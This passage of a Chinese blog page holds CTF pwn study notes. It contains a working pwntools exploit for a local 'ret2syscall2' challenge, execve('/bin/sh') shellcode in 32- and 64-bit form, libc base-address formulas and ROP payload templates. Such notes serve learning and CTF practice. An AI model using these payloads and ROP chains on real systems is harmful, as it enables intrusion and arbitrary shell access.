+<p>他这个买的时候输完数量确定之后就算成交。只有这个数量咱们有操作空间。想一想。直接输入恶意一点的。特殊字符或者不是正数。不按它要求来就行了。它输入这种就一直运行就停不下来了”^^^”</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/58878864/1760530409581-a9bafeba-9a97-44b5-b3a7-96bd69978b87.png"></p>
+<p>输入负数就行了</p>
+<p>这道题没有后门，ROP链要改一下。</p>
+<p>bin&#x2F;sh写到name里</p>
+<p>Exp</p>
+<pre><code class="language-python">from pwn import*
+context(arch=&#39;amd64&#39;, os=&#39;linux&#39;, log_level=&#39;debug&#39;)
+p=process(&#39;./ret2syscall2&#39;)
+gdb.attach(p,&#39;b menu&#39;)
+pop_rax = 0x458827
+pop_rdi = 0x40264f
+pop_rsi = 0x40a67e
+pop_rdx = 0x4a404b
+ret = 0x40101a 
+syscall = 0x402404
+bin_sh = 0x4E60F0
+
+p.sendline(b&#39;1&#39;)
+p.sendline(b&#39;3&#39;)
+p.sendline(b&#39;-999999&#39;)
+p.sendline(b&#39;4&#39;)
+p.sendline(b&#39;5&#39;)
+
+payload = b&#39;/bin/sh\x00&#39;
+payload += b&#39;A&#39; * (0x20) 
+payload += p64(pop_rax)  
+payload += p64(0x3b)        
+payload += p64(pop_rdi)  
+payload += p64(bin_sh)   
+payload += p64(pop_rsi)  
+payload += p64(0)     
+payload += p64(pop_rdx)  
+payload += p64(0) 
+payload += p64(0)
+payload += p64(ret)
+payload += p64(syscall) 
+
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<h2 id="fmt1"><a href="#fmt1" class="headerlink" title="fmt1"></a>fmt1</h2><h2 id="gdb调试在第二道shellcode里应用一下，想到的一些东西"><a href="#gdb调试在第二道shellcode里应用一下，想到的一些东西" class="headerlink" title="gdb调试在第二道shellcode里应用一下，想到的一些东西"></a>gdb调试在第二道shellcode里应用一下，想到的一些东西</h2><p>查看对应东西的指令</p>
+<pre><code class="language-plain">(gdb) x/i 0x4011f4          # 查看该地址对应的汇编指令
+(gdb) info symbol 0x4011f4  # 查看符号信息
+(gdb) bt                    # 查看完整调用栈
+</code></pre>
+<p>原来是拿ida直接看的这个bss段里面到底是啥(现在也不会用gdb看里面是什么函数)，这个buff具体在哪，它是不是可读可写可执行的。拿gdb试了一下</p>
+<pre><code class="language-plain">print &amp;buff
+</code></pre>
+<p>这个可以直接打印出buff的地址(</p>
+<pre><code class="language-plain">x/16x 0x4040A0 #查看从地址0x4040A0开始的16个字符的数据
+ x/s 0x4040A0 #显示这段地址指向的内存内容
+ x/4d 0x4040A0 #显示所在地址的4个整数内容
+</code></pre>
+<p><strong>0x7fffffffdcd0</strong> 是典型的栈地址：</p>
+<ul>
+<li>位于内存的高地址区域（x86-64架构栈通常从高地址向低地址增长）</li>
+</ul>
+<p>Linux默认代码段起始地址是0x400000</p>
+<p>这是检查有没有被覆盖</p>
+<pre><code class="language-plain">(gdb) x/gx $rsp + 0x108        # 查看返回地址是否被覆盖为 0x4040A0
+(gdb) x/32x $rsp              # 查看整个缓冲区的内存布局
+</code></pre>
+<p>我后来又想了想这个栈溢出到底在干啥。周三我终于明白了。其实最简单的栈溢出就是什么也没有，直接溢出就行.然后之后的这些libc，shellcode,syscall,都是因为返回地址缺失，导致溢出之后无法发送返回地址。所以才要构造这些东西来绕过具体的保护。</p>
+<h2 id="libc是在栈不可执行（NX），并且在bss段不可执行的时候。"><a href="#libc是在栈不可执行（NX），并且在bss段不可执行的时候。" class="headerlink" title="libc是在栈不可执行（NX），并且在bss段不可执行的时候。"></a>libc是在栈不可执行（NX），并且在bss段不可执行的时候。</h2><p>通过动态链接库libc(里面有system和bin&#x2F;sh这些符号)通过writes,puts.计算基地址。有了基地址后再算system和bin&#x2F;sh的地址。用前面了解到的公式</p>
+<pre><code class="language-plain">libc_base = puts_real_address -libc.sym[&#39;puts&#39;]
+system_address = libc_base + libc.sym[&#39;system&#39;]
+binsh_address = libc_base + next(libc.search(b&quot;/bin/sh&quot;))
+</code></pre>
+<h2 id="shellcode是在栈不可执行（NX），并且bss-段可执行，要溢出的函数不在栈上。或者干脆没有shellcode"><a href="#shellcode是在栈不可执行（NX），并且bss-段可执行，要溢出的函数不在栈上。或者干脆没有shellcode" class="headerlink" title="shellcode是在栈不可执行（NX），并且bss.段可执行，要溢出的函数不在栈上。或者干脆没有shellcode"></a>shellcode是在栈不可执行（NX），并且bss.段可执行，要溢出的函数不在栈上。或者干脆没有shellcode</h2><p>这个时候通常能直接发送shellcode来构造一个返回地址。问题就在于怎么处理这个shellcode了。是自动生成直接写入，还是需要补齐shellcode,写入到对应的bss段上。最后要找返回地址覆盖。</p>
+<p>当有mprotect函数的时候，即使有nx保护，也可以配合read和gets函数把shellcode写到bss段</p>
+<p>生成shellcode和补齐，还有直接利用汇编或网站转化汇编成</p>
+<pre><code class="language-plain">shellcode=asm(shellcraft.sh()) #自动生成
+payload=shellcode.ljust(0x108,b&#39;A&#39;) #补齐
+</code></pre>
+<p>手写shellcode时的汇编指令</p>
+<p>先熟悉一下基本汇编指令</p>
+<pre><code class="language-plain">mov rax,0x50 #把0x50赋值2给rax寄存器
+add rax,0x50 #将0x50加到rax寄存器
+push rax 将rax值推入栈中
+pop rax 将栈中存储的数据拿出放入rax
+xor al, 0x50 对al寄存器进行异或操作，与0x50进行异或（相同为0，不同为1）
+xor eax,dword ptr[rdx + 0x30] #先加0x30,取地址中存储的值。再异或
+</code></pre>
+<p>然后学了32位和64位shellcode的模板。由于32位和64位传参不同，编写shellcode时就不同。最后返回的就不一样，一个是0x80，一个是syscall。</p>
+<pre><code class="language-plain">；x32
+    push 0x68732f2f   
+    push 0x6e69622f 
+    mov ebx, esp   
+    xor ecx, ecx
+    xor edx, edx     
+    mov al, 0xb
+    int 0x80
+</code></pre>
+<pre><code class="language-plain">;x64
+    mov rbx, 0x0068723f6e69622f
+    push rbx
+    mov rdi,rsp
+    mov rsi,0
+    mov rdx,0
+    mov rax, 59      ;syscall号59
+    syscall 
+    ;这个是基本模板，如果有限制长度需要更改
+</code></pre>
+<p>因为第三道题read只让写0x25数据，你要通过read再写入shellcode直接自动生成是不行的。（因为自动生成的生成的长度比较长大约在0x70到0x100个之间）。手写shellcode汇编</p>
+<p>Syscall</p>
+<h2 id="retsyscall是call出来这个system-具体理论还不清楚。主要是会了syscall这个rop链"><a href="#retsyscall是call出来这个system-具体理论还不清楚。主要是会了syscall这个rop链" class="headerlink" title="retsyscall是call出来这个system?具体理论还不清楚。主要是会了syscall这个rop链"></a>retsyscall是call出来这个system?具体理论还不清楚。主要是会了syscall这个rop链</h2><h2 id="32和64位传参规则（Linux）"><a href="#32和64位传参规则（Linux）" class="headerlink" title="32和64位传参规则（Linux）"></a>32和64位传参规则（Linux）</h2><h3 id="系统调用下传参："><a href="#系统调用下传参：" class="headerlink" title="系统调用下传参："></a>系统调用下传参：</h3><p>32位触发指令：int 0x80</p>
+<p>寄存器：eax 系统调用号（0x0b）</p>
+<p>ebx、ecx、 edx、esi、edi 依次传参 </p>
+<p>调用bin&#x2F;sh</p>
+<pre><code class="language-plain">mov eax, 0x0b       ; 调用系统
+mov ebx, binsh_addr ; bin/sh
+mov ecx, 0          ; 置零
+mov edx, 0          
+int 0x80
+</code></pre>
+<p>64位触发指令：syscall</p>
+<p>传递寄存器：rax ,系统调用号（exexecve）</p>
+<p>为（0x3b）</p>
+<p>六个寄存器传参</p>
+<p>rdi rsi rdx r10 r8 r9</p>
+<p>一至六个参数</p>
+<pre><code class="language-plain">mov rax, 0x3b       ; 调用系统
+mov rdi, binsh_addr ; bin/sh
+mov rsi, 0          ; 置零
+mov rdx, 0          
+syscall
+</code></pre>
+<h3 id="普通调用传参"><a href="#普通调用传参" class="headerlink" title="普通调用传参"></a>普通调用传参</h3><p>32位从右向左压栈，最后清理栈空间</p>
+<p>调用（a,b,c）（注意后进先出）</p>
+<pre><code class="language-plain">push c  ; 先压最后出的
+push b
+push a
+call func
+add esp, 12 ; 清理空间，3×4=12
+</code></pre>
+<p>64位混合传递。先用寄存器，再用栈传参。</p>
+<p>前六个依次通过</p>
+<p>rdi rsi rdx rcx r8 r9</p>
+<p>rsp指针要求16字节栈对齐</p>
+<pre><code class="language-plain">mov rdi, a  
+mov rsi, b  
+mov rdx, c  
+mov rcx, d  
+mov r8, e   
+mov r9, f   
+push g      ; 参数7压栈
+call func   ；调用fun函数
+</code></pre>
+<pre><code class="language-plain"> x/10x $rsp
+ info registers
+</code></pre>
+<p>其它的：32位寄存器使用pop减少链长度</p>
+<p>整体压栈或通过指针传递</p>
+<p>64位注意栈对齐。用ret强制对齐。先用寄存器，再用栈传递</p>
+<h2 id="syscall的rop链（这是有bin-sh地址的）"><a href="#syscall的rop链（这是有bin-sh地址的）" class="headerlink" title="syscall的rop链（这是有bin&#x2F;sh地址的）"></a>syscall的rop链（这是有bin&#x2F;sh地址的）</h2><p>32位</p>
+<pre><code class="language-plain">payload = b&#39;A&#39; * offset  
+payload += p32(pop_eax_ret)  # ROPgadget pop eax; ret
+payload += p32(0xb)           # 调用系统
+payload += p32(pop_edx_ecx_ebx_ret)  # gadget: pop edx; pop ecx; pop ebx; ret
+payload += p32(0)                   # 置零
+payload += p32(0)                 
+payload += p32(binsh_addr)          ebx = bin/sh（在程序里找或者自己构造）
+payload += p32(int_0x80_addr)  # int 0x80
+</code></pre>
+<p>64位</p>
+<pre><code class="language-plain">payload = b&#39;A&#39; * offset  
+payload += p64(pop_rax_ret)  
+payload += p64(0x3b)         # execve（64位为59，0x3b）
+payload += p64(pop_rdi_ret)  
+payload += p64(binsh_addr)   # rdi = bin/sh
+payload += p64(pop_rsi_ret)  # ROPgadget: pop rsi; ret
+payload += p64(0)            #每次对应置零
+payload += p64(pop_rdx_ret)  
+payload += p64(0)           
+payload += p64(syscall_addr)  #最后调用系统
+</code></pre>
+<p>没有bin&#x2F;sh的时候</p>
+<pre><code class="language-plain">payload += p32(read_plt)          # 调用 read 函数
+payload += p32(pop_ebx_ret)       # 清理栈帧（返回地址）
+payload += p32(0)                 # fd (stdin)
+payload += p32(bss_addr)          # 目标地址（.bss 段）
+payload += p32(8)                 # 写入长度（/bin/sh\x00）
+</code></pre>
+<h2 id="sqctf复现"><a href="#sqctf复现" class="headerlink" title="sqctf复现"></a>sqctf复现</h2><p><a target="_blank" rel="noopener" href="https://hnusec-star.feishu.cn/wiki/Q2ztwN7nzihvsRkbuepcgk9onRd">yh3s</a></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/pwn/" style="color: #03a9f4">pwn</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/ret2libc/" style="color: #00bcd4">ret2libc</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/shellcode/" style="color: #00a596">shellcode</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/syscall/" style="color: #03a9f4">syscall</a>
+        </span>
+        
+    </div>
+    <a href="/2025/05/15/libc_shellcode_syscall/" class="go-post">阅读全文</a>
+</div>
+
+
+        <div class="page-current">
+    
+    <a class="page-num" href="/">
+        <i class="fa-solid fa-caret-left fa-fw"></i>
+    </a>
+    <a class="page-num" href="/">1</a>
+    <span class="page-omit">...</span>
+    
+    <span class="current">2</span>
+    
+    <a class="page-num" href="/page/3">
+        3
+    </a>
+    
+    
+    
+    
+    <a class="page-num" href="/page/3/">
+        <i class="fa-solid fa-caret-right fa-fw"></i>
+    </a>
+    
+</div>
+
+    </div>
+    
+    <div id="home-card">
+        <div id="card-style">
+    <div id="card-div">
+        <div class="avatar">
+            <img src="/images/lty.png" alt="avatar" />
+        </div>
+        <div class="name">良夜</div>
+        <div class="description">
+            <p>Here’s an cat…</p>
+
+        </div>
+        
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/ice993">
+                    <i
+                        class="fa-brands fa-github fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="http://wpa.qq.com/msgrd?v=3&uin=2940582316&site=qq&menu=yes">
+                    <i
+                        class="fa-brands fa-qq fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://x.com/Arctic_oceanIce">
+                    <i
+                        class="fa-brands fa-x-twitter fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a href="mailto:2940582316@qq.com">
+                    <i
+                        class="fa-solid fa-envelope fa-fw"
+                    ></i>
+                </a>
+            </span>
+            
+        </div>
+        
+        
+    </div>
+</div>
+
+    </div>
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2026 良夜の小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;良夜
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    <script>
+    if ("serviceWorker" in navigator) {
+        navigator.serviceWorker.register("/sw.js");
+    }
+    </script>
+</body>
+</html>
